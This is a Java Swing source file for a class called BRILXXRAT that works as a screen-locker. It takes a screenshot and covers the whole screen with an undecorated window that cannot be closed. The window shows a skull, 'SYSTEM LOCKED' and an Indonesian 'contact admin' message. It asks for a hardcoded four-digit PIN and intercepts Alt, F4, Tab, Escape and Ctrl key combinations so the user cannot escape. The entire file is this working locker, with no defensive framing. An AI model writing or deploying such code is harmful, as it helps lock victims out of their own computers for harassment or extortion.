import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;

public class BRILXXRAT extends JFrame {
    private JPasswordField passwordField;
    private String password = "1234";
    private BufferedImage screenCapture;
    private StringBuilder pinBuffer = new StringBuilder();

    public BRILXXRAT() {
        setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        setUndecorated(true);
        setExtendedState(JFrame.MAXIMIZED_BOTH);
        setLocationRelativeTo(null);
        
        captureScreen();
        
        JPanel mainPanel = new JPanel(new BorderLayout());
        mainPanel.setBackground(new Color(0, 0, 0));
        
        JPanel bgPanel = new JPanel() {
            @Override
            protected void paintComponent(Graphics g) {
                super.paintComponent(g);
                if (screenCapture != null) {
                    g.drawImage(screenCapture, 0, 0, getWidth(), getHeight(), null);
                    g.setColor(new Color(0, 0, 0, 180));
                    g.fillRect(0, 0, getWidth(), getHeight());
                }
            }
        };
        bgPanel.setLayout(new GridBagLayout());
        
        JPanel lockPanel = new JPanel();
        lockPanel.setBackground(new Color(0, 0, 0, 200));
        lockPanel.setPreferredSize(new Dimension(400, 600));
        lockPanel.setBorder(BorderFactory.createLineBorder(new Color(0, 255, 0), 3));
        lockPanel.setLayout(new BoxLayout(lockPanel, BoxLayout.Y_AXIS));
        
        JLabel titleLabel = new JLabel("▲ DIMZZ LOCKED ▲");
        titleLabel.setFont(new Font("Arial", Font.BOLD, 18));
        titleLabel.setForeground(new Color(255, 0, 0));
        titleLabel.setAlignmentX(Component.CENTER_ALIGNMENT);
        
        JLabel skullLabel = new JLabel("☠");
        skullLabel.setFont(new Font("Arial", Font.PLAIN, 60));
        skullLabel.setForeground(new Color(255, 100, 100));
        skullLabel.setAlignmentX(Component.CENTER_ALIGNMENT);
        
        JLabel systemLabel = new JLabel("SYSTEM LOCKED");
        systemLabel.setFont(new Font("Arial", Font.BOLD, 28));
        systemLabel.setForeground(new Color(0, 255, 0));
        systemLabel.setAlignmentX(Component.CENTER_ALIGNMENT);
        
        JLabel messageLabel = new JLabel("Hubungi admin untuk membuka.");
        messageLabel.setFont(new Font("Arial", Font.PLAIN, 12));
        messageLabel.setForeground(new Color(255, 165, 0));
        messageLabel.setAlignmentX(Component.CENTER_ALIGNMENT);
        
        JPanel pinDisplayPanel = new JPanel();
        pinDisplayPanel.setBackground(new Color(0, 0, 0, 100));
        pinDisplayPanel.setBorder(BorderFactory.createLineBorder(new Color(0, 255, 0), 2));
        pinDisplayPanel.setPreferredSize(new Dimension(280, 50));
        pinDisplayPanel.setMaximumSize(new Dimension(280, 50));
        
        JLabel pinDisplay = new JLabel("- - - -");
        pinDisplay.setFont(new Font("Arial", Font.PLAIN, 28));
        pinDisplay.setForeground(new Color(0, 255, 0));
        pinDisplay.setHorizontalAlignment(SwingConstants.CENTER);
        pinDisplayPanel.add(pinDisplay);
        
        JPanel keypadPanel = new JPanel(new GridLayout(4, 3, 10, 10));
        keypadPanel.setBackground(new Color(0, 0, 0, 0));
        keypadPanel.setPreferredSize(new Dimension(300, 280));
        keypadPanel.setMaximumSize(new Dimension(300, 280));
        
        for (int i = 1; i <= 9; i++) {
            JButton btn = createKeyButton(String.valueOf(i), pinDisplay);
            keypadPanel.add(btn);
        }
        
        JButton delBtn = createDeleteButton(pinDisplay);
        JButton zeroBtn = createKeyButton("0", pinDisplay);
        JButton okBtn = createOKButton(pinDisplay);
        
        keypadPanel.add(delBtn);
        keypadPanel.add(zeroBtn);
        keypadPanel.add(okBtn);
        
        JLabel enterLabel = new JLabel("ENTER PIN TO UNLOCK");
        enterLabel.setFont(new Font("Arial", Font.PLAIN, 10));
        enterLabel.setForeground(new Color(0, 255, 0));
        enterLabel.setAlignmentX(Component.CENTER_ALIGNMENT);
        
        lockPanel.add(Box.createVerticalStrut(20));
        lockPanel.add(titleLabel);
        lockPanel.add(Box.createVerticalStrut(15));
        lockPanel.add(skullLabel);
        lockPanel.add(Box.createVerticalStrut(15));
        lockPanel.add(systemLabel);
        lockPanel.add(Box.createVerticalStrut(5));
        lockPanel.add(messageLabel);
        lockPanel.add(Box.createVerticalStrut(20));
        lockPanel.add(pinDisplayPanel);
        lockPanel.add(Box.createVerticalStrut(20));
        lockPanel.add(keypadPanel);
        lockPanel.add(Box.createVerticalStrut(15));
        lockPanel.add(enterLabel);
        lockPanel.add(Box.createVerticalStrut(10));
        
        bgPanel.add(lockPanel);
        mainPanel.add(bgPanel, BorderLayout.CENTER);
        
        add(mainPanel);
        setVisible(true);
        
        disableSystemKeys();
    }
    
    private JButton createKeyButton(String label, JLabel pinDisplay) {
        JButton btn = new JButton(label);
        btn.setFont(new Font("Arial", Font.BOLD, 18));
        btn.setBackground(new Color(0, 0, 0));
        btn.setForeground(new Color(0, 255, 0));
        btn.setBorder(BorderFactory.createLineBorder(new Color(0, 255, 0), 2));
        btn.setFocusPainted(false);
        btn.addActionListener(e -> {
            if (pinBuffer.length() < 4) {
                pinBuffer.append(label);
                updatePinDisplay(pinDisplay);
                if (pinBuffer.length() == 4) {
                    checkPassword();
                }
            }
        });
        return btn;
    }
    
    private JButton createDeleteButton(JLabel pinDisplay) {
        JButton btn = new JButton("DEL");
        btn.setFont(new Font("Arial", Font.BOLD, 14));
        btn.setBackground(new Color(0, 0, 0));
        btn.setForeground(new Color(255, 0, 0));
        btn.setBorder(BorderFactory.createLineBorder(new Color(255, 0, 0), 2));
        btn.setFocusPainted(false);
        btn.addActionListener(e -> {
            if (pinBuffer.length() > 0) {
                pinBuffer.deleteCharAt(pinBuffer.length() - 1);
                updatePinDisplay(pinDisplay);
            }
        });
        return btn;
    }
    
    private JButton createOKButton(JLabel pinDisplay) {
        JButton btn = new JButton("OK");
        btn.setFont(new Font("Arial", Font.BOLD, 14));
        btn.setBackground(new Color(0, 100, 0));
        btn.setForeground(new Color(0, 255, 0));
        btn.setBorder(BorderFactory.createLineBorder(new Color(0, 255, 0), 2));
        btn.setFocusPainted(false);
        btn.addActionListener(e -> checkPassword());
        return btn;
    }
    
    private void updatePinDisplay(JLabel pinDisplay) {
        String display = "";
        for (int i = 0; i < 4; i++) {
            if (i < pinBuffer.length()) {
                display += "•";
            } else {
                display += "-";
            }
            if (i < 3) display += " ";
        }
        pinDisplay.setText(display);
    }
    
    private void captureScreen() {
        try {
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            screenCapture = new Robot().createScreenCapture(screenRect);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void checkPassword() {
        if (pinBuffer.toString().equals(password)) {
            System.exit(0);
        } else {
            pinBuffer.setLength(0);
            JOptionPane.showMessageDialog(this, "PIN salah", "Error", JOptionPane.ERROR_MESSAGE);
        }
    }
    
    private void disableSystemKeys() {
        KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(e -> {
            if (e.getID() == KeyEvent.KEY_PRESSED) {
                int keyCode = e.getKeyCode();
                if (keyCode == KeyEvent.VK_ALT || keyCode == KeyEvent.VK_F4 || 
                    keyCode == KeyEvent.VK_TAB || keyCode == KeyEvent.VK_ESCAPE ||
                    (e.isControlDown() && (keyCode == KeyEvent.VK_SHIFT || 
                     keyCode == KeyEvent.VK_DELETE || keyCode == KeyEvent.VK_M))) {
                    return true;
                }
            }
            return false;
        });
    }
    
    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> new BRILXXRAT());
    }
}
